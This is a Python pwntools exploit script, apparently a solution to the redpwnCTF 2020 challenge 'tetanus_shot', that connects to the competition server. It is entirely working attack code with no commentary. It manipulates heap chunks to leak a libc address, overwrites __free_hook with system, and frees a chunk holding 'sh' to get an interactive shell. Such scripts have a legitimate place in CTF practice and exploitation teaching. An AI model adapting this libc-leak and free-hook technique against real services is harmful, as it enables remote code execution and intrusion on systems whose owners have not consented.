from pwn import *

context.log_level = 'debug'

def create(size):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))

def delete(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def edit(idx, offset, val):
    p.sendlineafter('> ', '3')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(offset))
    p.sendlineafter('> ', str(val))

def prepend(idx, cnt, val):
    p.sendlineafter('> ', '4')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(cnt))
    for i in val:
        p.sendlineafter('> ', str(i))

def append(idx, cnt, val):
    p.sendlineafter('> ', '5')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(cnt))
    for i in val:
        p.sendlineafter('> ', str(i))

def view(idx, offset):
    p.sendlineafter('> ', '6')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(offset))

#p = process('./tetanus_shot')
p = remote('2020.redpwnc.tf', 31754)
e = ELF('./tetanus_shot')
l = e.libc

create(0x80)
create(0x10)
delete(0)
create(0x10)
create(0x10)
create(0x10)
create(0x10)
create(0x20)
create(0x10)

append(3, 1, [0x6873])
prepend(4, 4, list(range(4)))
append(0, 6, [0x1, 0x1, 0x1, 0x1, 0x12345678, 0x40])
prepend(4, 1, [0xaaaa])
prepend(4, 0x18, list(range(0x18)))
append(4, 2, [0x1111, 0x2222])

view(4, 29)
p.recvuntil(': ')

libc = int(p.recvline()) - 0x1eabe0
system = libc + l.sym['system']
print hex(libc)

create(0x20)
create(0x20)
prepend(8, 10, list(range(10)))
append(8, 10, [0x1, 0x1, 0x1, 0x1, libc+l.sym['__free_hook']-8, 0x40, 0x1, 0x1, libc+l.sym['__free_hook']-8, 0x40])
prepend(8, 1, [0xaaaa])
prepend(8, 0x18, list(range(0x18)))
append(0, 1, [system])
append(1, 1, [system])
delete(3)

p.interactive()
